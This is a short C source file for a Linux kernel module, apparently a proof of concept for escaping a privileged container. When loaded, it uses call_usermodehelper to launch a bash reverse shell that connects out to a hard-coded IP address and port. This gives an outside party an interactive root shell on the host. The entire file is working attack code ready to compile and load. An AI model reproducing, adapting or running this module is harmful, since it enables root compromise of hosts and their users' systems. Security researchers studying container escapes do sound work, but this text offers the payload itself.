#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kmod.h>
#include <linux/workqueue.h>
#include <linux/slab.h>

#define REVERSE_SHELL_CMD \
    "bash -i >& /dev/tcp/192.168.115.178/6999 0>&1"

/* Will hold our dynamically-allocated command string */
static char *cmd_buf;

/* argv and envp for call_usermodehelper */
static char *argv_local[4];
static char *envp_local[] = {
    "HOME=/",
    NULL
};

/* Work item to defer our userspace call */
static DECLARE_WORK(cb_work, NULL);

/* Work handler — runs in process context, outside of module init */
static void cb_work_handler(struct work_struct *work)
{
    pr_info("cb_work_handler: launching reverse shell\n");
    call_usermodehelper(argv_local[0], argv_local, envp_local, UMH_NO_WAIT);
}

static int __init connect_back_init(void)
{
    /* 1) Allocate & copy the command into kernel memory */
    cmd_buf = kmalloc(strlen(REVERSE_SHELL_CMD) + 1, GFP_KERNEL);
    if (!cmd_buf)
        return -ENOMEM;
    strcpy(cmd_buf, REVERSE_SHELL_CMD);

    /* 2) Populate argv */
    argv_local[0] = "/bin/bash";
    argv_local[1] = "-c";
    argv_local[2] = cmd_buf;
    argv_local[3] = NULL;

    /* 3) Initialize and schedule our work item */
    INIT_WORK(&cb_work, cb_work_handler);
    schedule_work(&cb_work);

    pr_info("connect_back: module loaded, work scheduled\n");
    return 0;
}

static void __exit connect_back_exit(void)
{
    /* Ensure any pending work has finished */
    flush_work(&cb_work);

    /* Free our command buffer */
    kfree(cmd_buf);

    pr_info("connect_back: module exiting\n");
}

module_init(connect_back_init);
module_exit(connect_back_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("RBT Security");
MODULE_DESCRIPTION("Deferred reverse‐shell via privileged container escape PoC");
